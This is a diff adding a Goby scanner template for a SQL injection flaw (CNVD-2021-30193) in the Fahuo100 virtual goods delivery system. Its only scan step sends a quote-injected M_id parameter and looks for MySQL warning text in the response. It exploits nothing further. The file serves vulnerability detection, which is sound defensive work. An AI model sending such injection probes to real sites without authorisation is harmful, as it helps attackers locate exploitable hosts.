@@ -1,0 +1,59 @@
+{
+      "Name": "Fahuo100 SQL Injection CNVD-2021-30193",
+      "Level": "2",
+      "Tags": [
+            "SQL Injection"
+      ],
+      "GobyQuery": "header=\"Cache-Control: no-store, no-cache\"",
+      "Description": "Fahuo100 virtual goods automatic delivery system is a powerful virtual goods automatic delivery system/article paid reading system.",
+      "Product": "Fahuo100",
+      "Homepage": "https://www.fahuo100.cn/",
+      "Author": "",
+      "Impact": "Fahuo100 M_id SQL Injection",
+      "Recommendation": "",
+      "References": [
+            "https://www.cnvd.org.cn/flaw/show/CNVD-2021-30193"
+      ],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/?M_id=1'&type=product",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "mysql",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Warning",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
